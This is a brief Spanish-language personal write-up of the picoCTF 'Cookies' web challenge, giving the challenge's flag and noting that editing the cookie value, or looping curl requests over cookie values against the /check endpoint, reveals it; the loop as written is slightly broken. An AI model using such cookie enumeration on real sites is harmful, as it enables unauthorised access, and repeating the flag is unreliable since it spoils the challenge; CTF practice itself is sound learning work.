#Reto 
## Descripcion del reto
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)
## Solucion
`picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}`
con cookie editor hasta el numero 18
![[Pasted image 20250922111807.png]]
## Notas
for i in 1{1..10}; do curl -s http://mercury.picoctf.net:54219/check -H  "Cookie: name=$1 "; done | grep pico
y con este te lo da direct
## Referencias
